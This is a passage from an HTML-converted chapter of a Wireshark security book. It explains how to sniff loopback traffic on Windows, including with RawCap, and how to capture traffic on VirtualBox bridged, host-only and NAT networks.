>3.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Select Network Adapters as the type of hardware and click</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.3000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Next.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:27.4000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l15 level1 lfo7;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-3.6000pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >4.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Select Microsoft as the manufacturer and select Microsoft Loopback Adapter as the network adapter (see<a name="_bookmark266" ></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark267" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-6</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Click Next.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section138" ><p class=MsoBodyText  style="margin-left:30.5000pt;" ><img width="745"  height="553"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker179540.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:3.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  align=center  style="margin-top:5.0000pt;margin-right:52.6000pt;margin-left:10.6000pt;text-indent:0.0000pt;text-align:center;" ><a name="_bookmark267" ></a><span><a href="#_bookmark266" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-6:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Installing the loopback adapter on Windows</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:9.9500pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l15 level1 lfo7;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-3.6000pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >5.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Click Next again to install the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.4000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >driver.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-21.0000pt;text-align:left;mso-list:l15 level1 lfo7;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-3.6000pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >6.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Click Finish to close the Add Hardware</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.5000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wizard.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You should now have a new interface using the loopback driver.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="343"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker179780.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section139" ><p class=MsoBodyText  style="margin-left:13.2500pt;" ><span><span style="position:absolute;z-index:1;margin-left:0.0000px;margin-top:0.0000px;width:763.0000px;height:82.0000px;" ><img width="763"  height="82"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker179808.png" ></span></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><h4 style="margin-top:4.5500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Sniffing without a Loopback Adapter on Windows</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:8.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You can sniff traffic destined for the localhost on Windows without installing a loopback adapter. Netresec has a public tool called </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >RawCap </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >that can be used to sniff any interface on a Windows machine that has an IP address, and specifically can sniff traffic destined for</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-right:9.0500pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >127.0.0.1</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. RawCap outputs to pcap format, which can then be easily loaded into Wireshark. You can review the RawCap web page on the Netresec site for a full explanation of how to use RawCap, but for our purposes we are just going to demonstrate how to use it to sniff localhost traffic. This is accomplished by double-clicking RawCap.exe, which displays the prompt shown in<a name="_bookmark269" ></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark270" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-7</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Select the appropriate network interface number&#8212;in this case, number 6 was chosen to sniff on the localhost. (Keep in mind that while it says Loopback, this isn&#8217;t an interface installed on the machine, like in the previous section.) We then chose the name loopback_dump.pcap, which is saved in the current working directory.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="780"  height="454"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker180876.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:11.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section140" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark270" ></a><span><a href="#_bookmark269" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-7:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >RawCap loopback sniffing</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:11.1500pt;" ><a name="_bookmark271" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you don&#8217;t have any traffic on the localhost of your machine, you can generate some by pinging </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >127.0.0.1</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. After you capture a decent amount of traffic, press Ctrl+C to kill RawCap.exe and save your file.<a name="_bookmark272" ></a>&nbsp;</span><span><a href="#_bookmark273" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-8</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows opening the pcap created by RawCap in Windows, which displays packets sent to localhost.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="779"  height="357"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker181292.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:9.1500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark273" ></a><span><a href="#_bookmark272" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-8:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >RawCap pcap in Wireshark</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="379"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker181363.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.5000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:4.3500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Sniffing on Virtual Machine Interfaces</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section141" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:8.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Security researchers, whether offensive like pentesters or defensive like malware analysts, have a habit of using a lot of virtual machines (VMs). You generally carry only a laptop to the job, but you might need to reconstruct an entire network of computers to test something in your portable lab of VMs. You also almost always need varying versions of the most popular operating systems ready to go.</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Debugging complicated lab setups while testing your exploits or looking for vulnerabilities can take a lot of time. It always helps if you can take a look at what an application is actually doing on the network. This is especially helpful when error messages are missing and/or nondescriptive.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9000pt;margin-right:9.6000pt;" ><a name="_bookmark274" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Which interface to sniff on in a VM environment depends a lot on</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >your specific setup and the use case. Each of the common networking setups for VirtualBox is explored in detail in this section. Note that while other virtualization solutions may use different names for their network types, they are all generally implemented the same way, and the following information can be applied for how to capture</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.3500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >traffic.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Bridge</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:10.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Connecting your VMs with the bridged setup means connecting them on the same layer 2 network as your host machine. This means that the interface to which you have bridged will be responding to multiple MAC addresses&#8212;the MAC address of the physical interface as well as the MAC address for every virtual machine that has been bridged to the physical interface. All the traffic passing through the bridge can be sniffed on the interface to which the virtual machine has been</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >bridged. This is especially useful if you are running multiple virtual machines and you want to see all the network traffic they are</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >generating.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:5.7500pt;" ><a name="_bookmark275" ></a><span><a href="#_bookmark276" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-9</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows bridging a Kali Linux VM to a Windows host physical interface </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >Realtek PCIe gigabit</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Note the MAC address within the VirtualBox configuration window (which is configurable when the VM is powered off).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section142" ><p class=MsoBodyText ><img width="778"  height="495"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker183388.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark276" ></a><span><a href="#_bookmark275" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-9:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >VirtualBox bridging</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  align=justify  style="margin-top:9.2000pt;margin-right:11.8500pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For my setup, the VM interface has an IP address of 192.168.2.12, and my host machine has an IP address of 192.168.2.14.<a name="_bookmark278" ></a>&nbsp;</span><span><a href="#_bookmark279" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-10</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-1.6000pt;font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows the Wireshark output <a name="_bookmark277" ></a>from the </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >em1 </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >interface (our host</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >interface).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >These ICMP packets show that from a network standpoint the VM is attached to the physical interface and uses its own MAC address for Ethernet communication. Again, this means that as far as the network is concerned, there are two distinct Ethernet devices with only one physical interface.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section143" ><p class=MsoBodyText ><img width="779"  height="586"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker183983.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark279" ></a><span><a href="#_bookmark278" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-10:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Wireshark sniffing bridged network</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="309"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker184066.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:5.8000pt;margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you want to capture only VM traffic and not traffic generated by your actual host, you could use a capture filter. The following capture filter would <a name="_bookmark280" ></a>apply to our previous example and capture only traffic</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section144" ><p class=MsoBodyText  style="margin-top:3.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >destined for the Kali virtual machine:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.3500pt;margin-right:114.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ether src host d8:cb:8a:99:33:8b || ether dst host08:00:27:5b:78:bb</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:8.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The downside is that you are exposing your VMs to whichever network the interface you have bridged is connected to. When deploying labs, you may want to ensure that the traffic is properly isolated, which is why you would use the host-only networking option, as discussed in the following section.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Host-only</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For host-only networking in Oracle VirtualBox, a virtual network interface (for example, vboxnet0) is created on the host machine that acts as a switch. The VMs are then transparent to the host, attached to this virtual host-only switch interface. This is handy when you want communication between VMs and the host machine, such as virtual servers offered privately to the host. In host-only mode, the VMs do not have access to the Internet, like they do in a NAT network. Host- only mode is also commonly used when you are setting up a lab environment that you want to isolate for analysis. When using host- only networking, it is often helpful to sniff all the traffic of the host- only network traffic from the host itself. One would initially think that sniffing on the host-only network interface with Wireshark would give you all the traffic on the host-only network. Remember, however, that this interface is acting as a switch, so it only receives broadcast traffic or traffic that is actually destined for that host interface. Therefore, when sniffing from the host, you will not see traffic between VMs.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:8.1000pt;margin-right:15.4500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Obviously, you can run Wireshark within each VM to sniff traffic generated by that VM, but this gets cumbersome with a lab setup of more than two VMs. Unfortunately, there isn&#8217;t an easy way to capture all the traffic on a host-only network. Because the unicast traffic between VirtualBox VMs connected as host-only mode cannot be captured by the host, VirtualBox offers a workaround (</span><span><a href="https://www.virtualbox.org/wiki/Network_tips" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >https://www.virtualbox.org/wiki/Network_tips</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >). However, being a command-line solution and requiring effort on each VM to be captured, this is no simple fix.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section145" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You can create your own host-only network by using the Linux bridging utilities and running your own DHCP server, or by just using static IP addresses. We discuss Linux bridging in more detail later in this chapter.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="309"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker186629.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><h4 style="margin-top:4.5000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >NAT</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:11.1500pt;" ><a name="_bookmark281" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Network address translation (NAT) is the default method of networking for connecting VMs to the outside world. When you configure NAT as the method for VM connections, your host machine is routing all the packets onto the network. It is a layer 3 connection, so you will not be able to analyze layer 2 traffic on the host side of the network. All traffic generated by your VMs will look like it originated from your host machine to the target network, and the VMs will receive all traffic forwarded by the host machine.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:7.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The NAT engine needs to keep track of all the connections made by the VMs in order to know where to send replies to these packets. This can generate problems when the VMs are generating a lot of connections (that is, port scanning). In these cases it might be a better idea to switch to bridged networking. If your network access is limited to one MAC address, for example, or 